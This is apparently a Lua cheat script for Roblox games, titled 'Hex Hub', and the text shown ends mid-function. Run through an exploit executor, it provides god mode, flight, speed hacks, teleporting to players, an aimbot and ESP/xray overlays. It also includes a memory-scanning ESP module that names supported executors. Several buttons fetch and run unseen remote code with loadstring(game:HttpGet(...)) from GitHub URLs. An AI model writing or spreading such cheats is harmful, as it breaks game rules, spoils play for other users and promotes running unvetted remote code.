local StarterGui = game:GetService("StarterGui")
	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	        game.StarterGui:SetCore("ChatMakeSystemMessage", { 
	            Text = ("The ui Has loaded. Welcome To HEX_HUB. Cheers!");
	            olCor = Color3.new(0,221,255);
                FontSize = Enum.FontSize.Size24;
	        })

			game.StarterGui:SetCore("SendNotification",  {
				Title = "Hex Hub";
				Text = "Press right shift to hide the ui, You can change this in credits";
				Icon = "";
				Duration = 10;
				Callback = NotificationBindable;
			   })



local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Hex Hub Trolling Gui", "Midnight")

local noclip = false

local infjumpenabled = false

game:GetService("UserInputService").JumpRequest:Connect(function()
	if infjumpenabled then
		game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState("Jumping")
	end
end)

--Home section

local Home = Window:NewTab("Home")
local HomeSection = Home:NewSection("Home:")

HomeSection:NewLabel("Created by Swax_0/!!!Swax#2600")

HomeSection:NewLabel("Version 1.8!")

local UpdateSection = Home:NewSection("Updates:")

UpdateSection:NewLabel("Improved Aimbot")

local Player = Window:NewTab("Main")
local PlayerSection = Player:NewSection("Player:")

PlayerSection:NewToggle("Infjump", "Enables flyjump", function(value)
	infjumpenabled = value
	end)

PlayerSection:NewSlider("Walkspeed", "Changes the walkspeed", 250, 16, function(v)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
end)

PlayerSection:NewSlider("Jumppower", "Changes the jumppower", 250, 50, function(v)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
end)
	
PlayerSection:NewSlider("FOV", "Changes your FOV", 120, 20, function(v)
    game:GetService'Workspace'.Camera.FieldOfView = v
end)

PlayerSection:NewButton("Walk on walls", "keybind for this is z(Not By Me)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bjmansell/Hex-Hub/main/Walk%20on%20walls", true))()
end)

PlayerSection:NewTextBox("Teleport to player", "Put the full name including caps", function(txt)
    local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
local pl2 = txt
local humanoid = game.Players.LocalPlayer.Character.Humanoid
humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
wait(0.1)

pl.CFrame = game.Players[pl2].Character.HumanoidRootPart.CFrame
end)

PlayerSection:NewButton("God Mode", "Makes your character invinsible/Hard in most games", function()
    local LocalPlayer = game:GetService("Players").LocalPlayer
local function Invincibility()
if LocalPlayer.Character then
for i, v in pairs(LocalPlayer.Character:GetChildren()) do
if v.Name == "hitbox" then
v:Destroy()
end
end
end
end
 
while wait(0.5) do
Invincibility(LocalPlayer)
end
end)

PlayerSection:NewButton("Old animations(R6)", "makes your character have the old roblox animations", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bjmansell/Hex-Hub/main/Old%20animations", true))()
end)

PlayerSection:NewButton("Marble!", "Turns your character into a marble basically", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bjmansell/Hex-Hub/main/Marble", true))()
end)

PlayerSection:NewButton("Sit", "What do u think it does huh", function()
	game.Players['LocalPlayer'].Character.Humanoid.Sit = true
	end)

PlayerSection:NewButton("E to fly (Read Desc)", "There is not a way to turn this off once executed you will not be able to deactivate it", function()
    repeat wait() 
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local torso = plr.Character.HumanoidRootPart 
local flying = true
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 50 
local speed = 0 

function Fly() 
local bg = Instance.new("BodyGyro", torso) 
bg.P = 9e4 
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
bg.cframe = torso.CFrame 
local bv = Instance.new("BodyVelocity", torso) 
bv.velocity = Vector3.new(0,0.1,0) 
bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
repeat wait() 
plr.Character.Humanoid.PlatformStand = true 
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
speed = speed+.5+(speed/maxspeed) 
if speed > maxspeed then 
speed = maxspeed 
end 
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
speed = speed-1 
if speed < 0 then 
speed = 0 
end 
end 
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
else 
bv.velocity = Vector3.new(0,0.1,0) 
end 
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
until not flying 
ctrl = {f = 0, b = 0, l = 0, r = 0} 
lastctrl = {f = 0, b = 0, l = 0, r = 0} 
speed = 0 
bg:Destroy() 
bv:Destroy() 
plr.Character.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
if key:lower() == "e" then 
if flying then flying = false 
else 
flying = true 
Fly() 
end 
elseif key:lower() == "w" then 
ctrl.f = 1 
elseif key:lower() == "s" then 
ctrl.b = -1 
elseif key:lower() == "a" then 
ctrl.l = -1 
elseif key:lower() == "d" then 
ctrl.r = 1 
end 
end) 
mouse.KeyUp:connect(function(key) 
if key:lower() == "w" then 
ctrl.f = 0 
elseif key:lower() == "s" then 
ctrl.b = 0 
elseif key:lower() == "a" then 
ctrl.l = 0 
elseif key:lower() == "d" then 
ctrl.r = 0 
end 
end)
Fly()
end)

local OtherSection = Player:NewSection("Other:")

OtherSection:NewButton("Build Tools", "Gives you building tools", function()
    for item = 1, 4 do
        HopperBin = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
        HopperBin.BinType = item
    end
end)

OtherSection:NewButton("Friend all", "Friends everyone in the game", function()
	game.StarterGui:SetCore("SendNotification",  {
		Title = "Friend all";
		Text = "Friended all";
		Duration = 2;
		Callback = NotificationBindable;
	   })

local obese = game:GetService('Players')
for _,kachow in pairs(obese:GetPlayers()) do
obese.LocalPlayer:RequestFriendship(kachow, kachow)
end
end)

OtherSection:NewButton("Teleport tool", "Click anywhere with the tool to teleport to your mouse", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Equip to Click TP"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)

OtherSection:NewButton("Rejoin", "Rejoins the game", function()
    local ts = game:GetService("TeleportService")

local p = game:GetService("Players").LocalPlayer

 

ts:Teleport(game.PlaceId, p)
end)



OtherSection:NewButton("Universal Aimbot (Beta)", "It is what it says on the tin", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bjmansell/Hex-Hub/main/Aimbot", true))()
end)



OtherSection:NewButton("LessLag", "Turns ur graphics down to potato level", function()
    local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
end)

--ESP_____________

local ESPEnabled = false
local DistanceEnabled = true
local TracersEnabled = true

pcall(function()
	
	Camera = game:GetService("Workspace").CurrentCamera
	RunService = game:GetService("RunService")
	camera = workspace.CurrentCamera
	Bottom = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y)

	function GetPoint(vector3)
		local vector, onScreen = camera:WorldToScreenPoint(vector3)
		return {Vector2.new(vector.X,vector.Y),onScreen,vector.Z}
	end
	
	function MakeESP(model)
		local CurrentParent = model.Parent
	
		local TopL = Drawing.new("Line")
		local BottomL = Drawing.new("Line")
		local LeftL = Drawing.new("Line")
		local RightL = Drawing.new("Line")
		local Tracer = Drawing.new("Line")
		local Display = Drawing.new("Text")

        coroutine.resume(coroutine.create(function()
			while model.Parent == CurrentParent do
				
				local Distance = (Camera.CFrame.Position - model.HumanoidRootPart.Position).Magnitude
                local GetP = GetPoint(model.Head.Position)
                local headps = model.Head.CFrame
                
				if ESPEnabled and GetP[2] then
					
                    -- Calculate Cords
                    local topright = headps * CFrame.new(3,0.5, 0)
                    local topleft = headps * CFrame.new(-3,0.5, 0)
                    local bottomleft = headps * CFrame.new(-3,-7,0)
                    local bottomright = headps * CFrame.new(3,-7,0)
					topright = GetPoint(topright.p)[1]
					topleft = GetPoint(topleft.p)[1]
					bottomleft = GetPoint(bottomleft.p)[1]
					bottomright = GetPoint(bottomright.p)[1]

                    local teamcolor = game:GetService("Players")[model.Name].TeamColor.Color or Color3.fromRGB(0,0,0)
                    TopL.Color, BottomL.Color, RightL.Color, LeftL.Color = teamcolor, teamcolor, teamcolor, teamcolor
                    TopL.From, BottomL.From, RightL.From, LeftL.From = topleft, bottomleft, topright, topleft
                    TopL.To, BottomL.To, RightL.To, LeftL.To = topright, bottomright, bottomright, bottomleft
					TopL.Visible, BottomL.Visible, RightL.Visible, LeftL.Visible = true, true, true, true
				else
					TopL.Visible, BottomL.Visible, RightL.Visible, LeftL.Visible = false, false, false, false
                end
                
				if ESPEnabled and TracersEnabled and GetP[2] then
					Tracer.Color = game:GetService("Players")[model.Name].TeamColor.Color or Color3.fromRGB(0,0,0)
					Tracer.From = Bottom
					Tracer.To = GetPoint(headps.p)[1]
					Tracer.Thickness = 1.5
					Tracer.Visible = true
				else
					Tracer.Visible = false
                end
                
				if ESPEnabled and DistanceEnabled and GetP[2] then
					Display.Visible = true
					Display.Position = GetPoint(headps.p + Vector3.new(0,0.5,0))[1]
					Display.Center = true
					Display.Text = tostring(math.floor(Distance)).." studs"
				else
					Display.Visible = false
                end
                
				RunService.RenderStepped:Wait()
			end
	
			TopL:Remove()
			BottomL:Remove()
			RightL:Remove()
			LeftL:Remove()
			Tracer:Remove()
			Display:Remove()
        
        end))
    end
    
	for _, Player in next, game:GetService("Players"):GetChildren() do
		if Player.Name ~= game.Players.LocalPlayer.Name then
			MakeESP(Player.Character)
			Player.CharacterAdded:Connect(function()
				delay(0.5, function()
					MakeESP(Player.Character)
				end)
			end)
		end	
	end
	
	game:GetService("Players").PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function()
            delay(0.5, function()
                MakeESP(player.Character)
            end)
		end)
	end)
	
end)

local ESPSection = Player:NewSection("Visuals")

ESPSection:NewButton("Fullbright(Press Again to turn off)", "Turns on FullBright", function()
	if not _G.FullBrightExecuted then

		_G.FullBrightEnabled = false
	
		_G.NormalLightingSettings = {
			Brightness = game:GetService("Lighting").Brightness,
			ClockTime = game:GetService("Lighting").ClockTime,
			FogEnd = game:GetService("Lighting").FogEnd,
			GlobalShadows = game:GetService("Lighting").GlobalShadows,
			Ambient = game:GetService("Lighting").Ambient
		}
	
		game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
			if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
				_G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").Brightness = 1
			end
		end)
	
		game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
			if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
				_G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").ClockTime = 12
			end
		end)
	
		game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
			if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
				_G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").FogEnd = 786543
			end
		end)
	
		game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
			if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
				_G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").GlobalShadows = false
			end
		end)
	
		game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
			if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
				_G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
			end
		end)
	
		game:GetService("Lighting").Brightness = 1
		game:GetService("Lighting").ClockTime = 12
		game:GetService("Lighting").FogEnd = 786543
		game:GetService("Lighting").GlobalShadows = false
		game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
	
		local LatestValue = true
		spawn(function()
			repeat
				wait()
			until _G.FullBrightEnabled
			while wait() do
				if _G.FullBrightEnabled ~= LatestValue then
					if not _G.FullBrightEnabled then
						game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
						game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
						game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
						game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
						game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
					else
						game:GetService("Lighting").Brightness = 1
						game:GetService("Lighting").ClockTime = 12
						game:GetService("Lighting").FogEnd = 786543
						game:GetService("Lighting").GlobalShadows = false
						game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
					end
					LatestValue = not LatestValue
				end
			end
		end)
	end
	
	_G.FullBrightExecuted = true
	_G.FullBrightEnabled = not _G.FullBrightEnabled
end)

ESPSection:NewToggle("Xray", "Turns on Xray vision", function(t)
    if t then
        for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and not v.Parent.Parent:FindFirstChild("Humanoid") then
				v.Transparency = v.Transparency + 0.5
			end
		end
    else
        for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and not v.Parent.Parent:FindFirstChild("Humanoid") then
				v.Transparency = v.Transparency - 0.5
			end
		end
    end
end)

ESPSection:NewToggle("Enabled", "Enables the ESP(Beta)", function(t)
    ESPEnabled = t
end)

ESPSection:NewToggle("Tracers", "Activates tracers for the ESP Duh", function(t)
    TracersEnabled = t
end)

ESPSection:NewToggle("Distance Display", "Shows the distance from u to the player", function(t)
    DistanceEnabled = t
end)

ESPSection:NewButton("universal ESP", "Loads and ESP script", function()
    assert(Drawing, 'exploit not supported')

if not syn and not PROTOSMASHER_LOADED then print'Unnamed ESP only officially supports Synapse and Protosmasher! If you\'re an exploit developer and have added drawing API to your exploit, try setting syn as true then checking if that works, otherwise, DM me on discord @ cppbook.org#1968 or add an issue to the Unnamed ESP Github Repository and I\'ll see it through email!' end

local UserInputService	= game:GetService'UserInputService';
local HttpService	= game:GetService'HttpService';
local GUIService	= game:GetService'GuiService';
local TweenService	= game:GetService'TweenService';
local RunService	= game:GetService'RunService';
local Players		= game:GetService'Players';
local LocalPlayer	= Players.LocalPlayer;
local Camera		= workspace.CurrentCamera;
local Mouse		= LocalPlayer:GetMouse();
local V2New		= Vector2.new;
local V3New		= Vector3.new;
local WTVP		= Camera.WorldToViewportPoint;
local WorldToViewport	= function(...) return WTVP(Camera, ...) end;
local Menu		= {};
local MouseHeld		= false;
local LastRefresh	= 0;
local OptionsFile	= 'IC3_ESP_SETTINGS.dat';
local Binding		= false;
local BindedKey		= nil;
local OIndex		= 0;
local LineBox		= {};
local UIButtons		= {};
local Sliders		= {};
local ColorPicker	= { Loading = false; LastGenerated = 0 };
local Dragging		= false;
local DraggingUI	= false;
local Rainbow		= false;
local DragOffset	= V2New();
local DraggingWhat	= nil;
local OldData		= {};
local IgnoreList	= {};
local EnemyColor	= Color3.new(1, 0, 0);
local TeamColor		= Color3.new(0, 1, 0);
local MenuLoaded	= false;
local ErrorLogging	= false;
local TracerPosition	= V2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y - 135);
local DragTracerPosition= false;
local SubMenu 		= {};
local IsSynapse 	= syn and not PROTOSMASHER_LOADED;
local Connections 	= { Active = {} };
local Signal 		= {}; Signal.__index = Signal;
local GetCharacter;
local CurrentColorPicker;
local Spectating;

local Executor = (identifyexecutor or (function() return '' end))()
local SupportedExploits = { 'Synapse X', 'ScriptWare', 'Krnl', 'OxygenU', 'Temple' }
local QUAD_SUPPORTED_EXPLOIT = table.find(SupportedExploits, Executor) ~= nil

-- if not PROTOSMASHER_LOADED then Drawing.UseCompatTransparency = true; end -- For Elysian

shared.MenuDrawingData	= shared.MenuDrawingData or { Instances = {} };
shared.InstanceData	= shared.InstanceData or {};
shared.RSName		= shared.RSName or ('UnnamedESP_by_ic3-' .. HttpService:GenerateGUID(false));

local GetDataName	= shared.RSName .. '-GetData';
local UpdateName	= shared.RSName .. '-Update';

local Debounce		= setmetatable({}, {
	__index = function(t, i)
		return rawget(t, i) or false
	end;
});

if shared.UESP_InputChangedCon then shared.UESP_InputChangedCon:Disconnect() end
if shared.UESP_InputBeganCon then shared.UESP_InputBeganCon:Disconnect() end
if shared.UESP_InputEndedCon then shared.UESP_InputEndedCon:Disconnect() end
if shared.CurrentColorPicker then shared.CurrentColorPicker:Dispose() end

local RealPrint, LastPrintTick = print, 0;
local LatestPrints = setmetatable({}, { __index = function(t, i) return rawget(t, i) or 0 end });

local function print(...)
	local Content = unpack{...};
	local print = RealPrint;

	if tick() - LatestPrints[Content] > 5 then
		LatestPrints[Content] = tick();
		print(Content);
	end
end

local function FromHex(HEX)
	HEX = HEX:gsub('#', '');
	
	return Color3.fromRGB(tonumber('0x' .. HEX:sub(1, 2)), tonumber('0x' .. HEX:sub(3, 4)), tonumber('0x' .. HEX:sub(5, 6)));
end

local function IsStringEmpty(String)
	if type(String) == 'string' then
		return String:match'^%s+$' ~= nil or #String == 0 or String == '' or false;
	end
	
	return false;
end

local function Set(t, i, v)
	t[i] = v;
end

local Teams = {};
local CustomTeams = { -- Games that don't use roblox's team system
	[2563455047] = {
		Initialize = function()
			Teams.Sheriffs = {}; -- prevent big error
			Teams.Bandits = {}; -- prevent big error
			local Func = game:GetService'ReplicatedStorage':WaitForChild('RogueFunc', 1);
			local Event = game:GetService'ReplicatedStorage':WaitForChild('RogueEvent', 1);
			local S, B = Func:InvokeServer'AllTeamData';

			Teams.Sheriffs = S;
			Teams.Bandits = B;

			Event.OnClientEvent:Connect(function(id, PlayerName, Team, Remove) -- stolen straight from decompiled src lul
				if id == 'UpdateTeam' then
					local TeamTable, NotTeamTable
					if Team == 'Bandits' then
						TeamTable = TDM.Bandits
						NotTeamTable = TDM.Sheriffs
					else
						TeamTable = TDM.Sheriffs
						NotTeamTable = TDM.Bandits
					end
					if Remove then
						TeamTable[PlayerName] = nil
					else
						TeamTable[PlayerName] = true
						NotTeamTable[PlayerName] = nil
					end
					if PlayerName == LocalPlayer.Name then
						TDM.Friendlys = TeamTable
						TDM.Enemies = NotTeamTable
					end
				end
			end)
		end;
		CheckTeam = function(Player)
			local LocalTeam = Teams.Sheriffs[LocalPlayer.Name] and Teams.Sheriffs or Teams.Bandits;
			
			return LocalTeam[Player.Name] and true or false;
		end;
	};
	[5208655184] = {
		CheckTeam = function(Player)
			local LocalLastName = LocalPlayer:GetAttribute'LastName' if not LocalLastName or IsStringEmpty(LocalLastName) then return true end
			local PlayerLastName = Player:GetAttribute'LastName' if not PlayerLastName then return false end

			return PlayerLastName == LocalLastName
		end
	};
	[3541987450] = {
		CheckTeam = function(Player)
			local LocalStats = LocalPlayer:FindFirstChild'leaderstats';
			local LocalLastName = LocalStats and LocalStats:FindFirstChild'LastName'; if not LocalLastName or IsStringEmpty(LocalLastName.Value) then return true; end
			local PlayerStats = Player:FindFirstChild'leaderstats';
			local PlayerLastName = PlayerStats and PlayerStats:FindFirstChild'LastName'; if not PlayerLastName then return false; end

			return PlayerLastName.Value == LocalLastName.Value;
		end;
	};
    [6032399813] = {
		CheckTeam = function(Player)
			local LocalStats = LocalPlayer:FindFirstChild'leaderstats';
			local LocalGuildName = LocalStats and LocalStats:FindFirstChild'Guild'; if not LocalGuildName or IsStringEmpty(LocalGuildName.Value) then return true; end
			local PlayerStats = Player:FindFirstChild'leaderstats';
			local PlayerGuildName = PlayerStats and PlayerStats:FindFirstChild'Guild'; if not PlayerGuildName then return false; end

			return PlayerGuildName.Value == LocalGuildName.Value;
		end;
	};
    [5735553160] = {
		CheckTeam = function(Player)
			local LocalStats = LocalPlayer:FindFirstChild'leaderstats';
			local LocalGuildName = LocalStats and LocalStats:FindFirstChild'Guild'; if not LocalGuildName or IsStringEmpty(LocalGuildName.Value) then return true; end
			local PlayerStats = Player:FindFirstChild'leaderstats';
			local PlayerGuildName = PlayerStats and PlayerStats:FindFirstChild'Guild'; if not PlayerGuildName then return false; end

			return PlayerGuildName.Value == LocalGuildName.Value;
		end;
	};
};

local RenderList = {Instances = {}};

function RenderList:AddOrUpdateInstance(Instance, Obj2Draw, Text, Color)
	RenderList.Instances[Instance] = { ParentInstance = Instance; Instance = Obj2Draw; Text = Text; Color = Color };
	return RenderList.Instances[Instance];
end

local CustomPlayerTag;
local CustomESP;
local CustomCharacter;
local GetHealth;
local GetAliveState;
local CustomRootPartName;

local Modules = {
	[292439477] = {
		CustomESP = function()
			if type(shared.PF_Replication) ~= 'table' then
				local lastScan = shared.pfReplicationScan

				if (tick() - (lastScan or 0)) > 0.01 then
					shared.pfReplicationScan = tick()

					local gc = getgc(true)
					for i = 1, #gc do
						local gcObject = gc[i];
						if type(gcObject) == 'table' and type(rawget(gcObject, 'getbodyparts')) == 'function' then
							shared.PF_Replication = gcObject;
							break
						end
					end
				end

				return
			end

			for Index, Player in pairs(Players:GetPlayers()) do
				if Player == LocalPlayer then continue end

				local Body = shared.PF_Replication.getbodyparts(Player);

				if type(Body) == 'table' and typeof(rawget(Body, 'torso')) == 'Instance' then
					Player.Character = Body.torso.Parent
					continue
				end

				Player.Character = nil;
			end
		end,

		GetHealth = function(Player)
			if type(shared.pfHud) ~= 'table' then
				return false
			end

			return shared.pfHud:getplayerhealth(Player)
		end,

		GetAliveState = function(Player)
			if type(shared.pfHud) ~= 'table' then
				local lastScan = shared.pfHudScan

				if (tick() - (lastScan or 0)) > 0.1 then
					shared.pfHudScan = tick()

					local gc = getgc(true)
					for i = 1, #gc do
						local gcObject = gc[i];
						if type(gcObject) == 'table' and type(rawget(gcObject, 'getplayerhealth')) == 'function' then
							shared.pfHud = gcObject;
							break
						end
					end
				end

				return
			end

			return shared.pfHud:isplayeralive(Player)
		end,

		CustomRootPartName = 'Torso',
	};
	[2950983942] = {
		CustomCharacter = function(Player)
			if workspace:FindFirstChild'Players' then
				return workspace.Players:FindFirstChild(Player.Name);
			end
		end
	};
	[2262441883] = {
		CustomPlayerTag = function(Player)
			return Player:FindFirstChild'Job' and (' [' .. Player.Job.Value .. ']') or '';
		end;
		CustomESP = function()
			if workspace:FindFirstChild'MoneyPrinters' then
				for i, v in pairs(workspace.MoneyPrinters:GetChildren()) do
					local Main	= v:FindFirstChild'Main';
					local Owner	= v:FindFirstChild'TrueOwner';
					local Money	= v:FindFirstChild'Int' and v.Int:FindFirstChild'Money' or nil;
					if Main and Owner and Money then
						local O = tostring(Owner.Value);
						local M = tostring(Money.Value);

						pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, string.format('Money Printer\nOwned by %s\n[%s]', O, M), Color3.fromRGB(13, 255, 227));
					end
				end
			end
		end;
	};
	-- [4581966615] = {
	-- 	CustomESP = function()
	-- 		if workspace:FindFirstChild'Entities' then
	-- 			for i, v in pairs(workspace.Entities:GetChildren()) do
	-- 				if not v.Name:match'Printer' then continue end

	-- 				local Properties = v:FindFirstChild'Properties' if not Properties then continue end
	-- 				local Main	= v:FindFirstChild'hitbox';
	-- 				local Owner	= Properties:FindFirstChild'Owner';
	-- 				local Money	= Properties:FindFirstChild'CurrentPrinted'
					
	-- 				if Main and Owner and Money then
	-- 					local O = Owner.Value and tostring(Owner.Value) or 'no one';
	-- 					local M = tostring(Money.Value);

	-- 					pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, string.format('Money Printer\nOwned by %s\n[%s]', O, M), Color3.fromRGB(13, 255, 227));
	-- 				end
	-- 			end
	-- 		end
	-- 	end;
	-- };
	[4801598506] = {
		CustomESP = function()
			if workspace:FindFirstChild'Mobs' and workspace.Mobs:FindFirstChild'Forest1' then
				for i, v in pairs(workspace.Mobs.Forest1:GetChildren()) do
					local Main	= v:FindFirstChild'Head';
					local Hum	= v:FindFirstChild'Mob';

					if Main and Hum then
						pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, string.format('[%s] [%s/%s]', v.Name, Hum.Health, Hum.MaxHealth), Color3.fromRGB(13, 255, 227));
					end
				end
			end
		end;
	};
	[2555873122] = {
		CustomESP = function()
			if workspace:FindFirstChild'WoodPlanks' then
				for i, v in pairs(workspace:GetChildren()) do
					if v.Name == 'WoodPlanks' then
						local Main = v:FindFirstChild'Wood';

						if Main then
							pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, 'Wood Planks', Color3.fromRGB(13, 255, 227));
						end
					end
				end
			end
		end;
	};
	[5208655184] = {
		CustomESP = function()
			-- if workspace:FindFirstChild'Live' then
			-- 	for i, v in pairs(workspace.Live:GetChildren()) do
			-- 		if v.Name:sub(1, 1) == '.' then
			-- 			local Main = v:FindFirstChild'Head';

			-- 			if Main then
			-- 				pcall(RenderList.AddOrUpdateInstance, RenderList, v, Main, v.Name:sub(2), Color3.fromRGB(250, 50, 40));
			-- 			end
			-- 		end
			-- 	end
			-- end
		end;
		CustomPlayerTag = function(Player)
			if game.PlaceVersion < 457 then return '' end

			local Name = '';
			local FirstName = Player:GetAttribute'FirstName'

			if typeof(FirstName) == 'string' and #FirstName > 0 then
				local Prefix = '';
				local Extra = {};
				Name = Name .. '\n[';

				if Player:GetAttribute'Prestige' > 0 then
					Name = Name .. '#' .. tostring(Player:GetAttribute'Prestige') .. ' ';
				end
				if not IsStringEmpty(Player:GetAttribute'HouseRank') then
					Prefix = Player:GetAttribute'HouseRank' == 'Owner' and (Player:GetAttribute'Gender' == 'Female' and 'Lady ' or 'Lord ') or '';
				end
				if not IsStringEmpty(FirstName) then
					Name = Name .. '' .. Prefix .. FirstName;
				end
				if not IsStringEmpty(Player:GetAttribute'LastName') then
					Name = Name .. ' ' .. Player:GetAttribute'LastName';
				end

				if not IsStringEmpty(Name) then Name = Name .. ']'; end

				local Character = GetCharacter(Player);

				if Character then
					if Character and Character:FindFirstChild'Danger' then table.insert(Extra, 'D'); end
					if Character:FindFirstChild'ManaAbilities' and Character.ManaAbilities:FindFirstChild'ManaSprint' then table.insert(Extra, 'D1'); end

					if Character:FindFirstChild'Mana'	 		then table.insert(Extra, 'M' .. math.floor(Character.Mana.Value)); end
